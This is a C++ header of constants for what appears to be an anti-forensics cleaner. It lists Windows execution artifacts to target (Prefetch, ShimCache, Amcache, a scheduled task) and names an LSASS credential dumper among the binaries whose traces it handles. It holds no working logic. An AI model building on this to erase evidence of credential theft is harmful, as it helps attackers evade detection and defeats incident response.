#pragma once

#include <Windows.h>
#include <fstream>
#include <vector>
#include <algorithm>
#include <string>

#define BUFFER_SIZE         4096
#define SHIMCACHE_MAGIC     0x73743031

#define TEMP_DIR            "C:\\tempodempo"
#define TEMPO_FILE          "C:\\tempodempo\\tempo.txt"
#define TASK_FILE           "C:\\Windows\\System32\\Tasks\\mindFlush"
#define PREFETCH_DIR        "C:\\Windows\\Prefetch\\"
#define SHIMCACHE_REG_KEY   "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache"
#define SHIMCACHE_REG_VAL   "AppCompatCache"
#define AMCACHE_HVE         "C:\\Windows\\AppCompat\\Programs\\Amcache.hve"
#define AMCACHE_TEMP_KEY    "TempAmc_CR"
#define AMCACHE_ROOT        "Root\\InventoryApplicationFile"
#define AMCACHE_PATH_VALUE  "LowerCaseLongPath"

#define BIN_BUSINESSANALYZER    "BUSINESSANALYZER"
#define BIN_LSASS_DUMPER        "LSASSSILENTPROCESSEXIT"
#define BIN_SELF                "CLEANERUP"
#define BIN_BUSINESSANALYZER_W  L"BusinessAnalyzer"
#define BIN_LSASS_DUMPER_W      L"LsassSilentProcessExit"
#define BIN_SELF_W              L"Cleanerup"
